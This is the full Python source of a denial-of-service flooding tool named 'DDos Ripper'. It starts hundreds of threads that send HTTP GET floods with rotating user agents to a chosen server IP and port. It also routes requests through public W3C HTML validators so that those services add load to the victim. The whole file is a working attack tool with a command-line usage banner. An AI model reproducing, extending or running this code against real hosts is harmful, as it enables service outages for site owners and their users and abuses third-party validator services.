#!/usr/bin/python3
# -*- coding: utf-8 -*-


import sys
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

print('''


██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝                                                              
                                                             ©EngineRipper
                                                             reference by Hammer
''')

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla / 5.0(X11;Linux i686; rv:81.0) Gecko / 20100101 Firefox / 81.0")
	uagent.append("Mozilla / 5.0(Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxi686;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	return(uagent)


#Validators are used as bonus external bots that apply extra pressure to the host while trying to validate it
def validators():
	global vals
	vals=[]
	vals.append("https://validator.w3.org/nu/?doc=http://")
	vals.append("https://validator.w3.org/checklink?uri=http://")
	vals.append("https://html5.validator.nu/?doc=http://")
	return(vals)


def bot_rippering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			logging.info("\033[95mbot is rippering...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it():
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				logging.info("\033[92m" + time.ctime(time.time()) + "\033[0m \033[92m <--packet sent! rippering--> \033[0m")
			else:
				s.shutdown(1)
				logging.error("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		logging.error("\033[91mno connection! web server maybe down!\033[0m")
		time.sleep(.1)


def dos():
	while True:
		down_it()


def dos2():
	while True:
		bot_rippering(random.choice(vals)+host)


def usage():
	print (''' \033[0;95mDDos Ripper 
	Usage : python3 dripper.py [-s] [-p] [-t] [-q]
	-h : --help
	-s : --server ip
	-p : --port default 80
	-q : --quiet mode (only log errors)
	-t : --threads default 135 (best within 100-400)\033[0m ''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Rippers")
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s [IP]")
	optp.add_option("-p","--port",type="int",dest="port",help="-p [PORT] default 80")
	optp.add_option("-t","--threads",type="int",dest="threads",help="-t [THREADS] default 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help")
	optp.add_option("-q", "--quiet", help="only log ERRORs", action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port

	if opts.threads is None:
		thr = 135
	else:
		thr = opts.threads


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," threads: ",str(thr),"\033[0m")
	print("\033[94mPlease wait...\033[0m")
	user_agent()
	validators()
	time.sleep(3)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		logging.error("\033[91mCheck server ip and port\033[0m")
		usage()
	print("\033[92mConnected successfully. Sending packets.. \033[0m")
	for i in range(int(thr)):
		t = threading.Thread(target=dos)
		t.daemon = True
		t.start()
		t2 = threading.Thread(target=dos2)
		t2.daemon = True
		t2.start()

	while True:
		time.sleep(.1)
